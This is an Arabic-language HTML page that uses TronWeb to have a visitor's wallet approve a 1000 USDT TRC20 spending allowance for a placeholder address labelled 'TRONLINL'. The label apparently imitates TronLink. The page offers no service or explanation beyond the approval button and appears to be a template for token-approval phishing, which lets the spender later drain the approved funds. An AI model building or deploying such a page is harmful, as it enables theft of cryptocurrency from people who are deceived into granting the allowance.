<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>موافقة USDT TRC20 على TRON</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 100px;
    }
    button {
      font-size: 20px;
      padding: 10px 20px;
      cursor: pointer;
    }
    #status {
      margin-top: 20px;
      font-weight: bold;
      color: green;
    }
  </style>
</head>
<body>

<h1>موافقة 1000 USDT (TRC20) لمحفظة TRONLINL</h1>
<button id="approveBtn">موافقة</button>

<div id="status"></div>

<script>
  // عنوان عقد USDT على TRON
  const usdtContractAddress = 'TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn';

  // محفظة TRONLINL (بدلها بالعنوان الحقيقي)
  const spenderAddress = 'TXXXXXXXXXXXXXXXXXXXXXXXXXXXX'; // ضع هنا العنوان الصحيح

  // 1000 USDT = 1000 * 10^6 لأن USDT TRC20 لها 6 أرقام عشرية
  const amount = 1000 * 1_000_000;

  const statusDiv = document.getElementById('status');
  const approveBtn = document.getElementById('approveBtn');

  approveBtn.addEventListener('click', async () => {
    if (typeof window.tronWeb === 'undefined') {
      alert('يرجى تثبيت TronLink أو محفظة تدعم TRON.');
      return;
    }

    try {
      const tronWeb = window.tronWeb;

      // التحقق من اتصال المحفظة
      const userAddress = tronWeb.defaultAddress.base58;
      if (!userAddress) {
        alert('يرجى فتح محفظتك وتسجيل الدخول.');
        return;
      }

      statusDiv.textContent = 'جار إرسال طلب الموافقة...';

      const contract = await tronWeb.contract().at(usdtContractAddress);

      const txn = await contract.approve(spenderAddress, amount).send({
        feeLimit: 100_000_000
      });

      statusDiv.textContent = 'تم إرسال المعاملة! TxID: ' + txn;

    } catch (error) {
      console.error(error);
      statusDiv.textContent = 'حدث خطأ: ' + error.message;
    }
  });
</script>

</body>
</html>
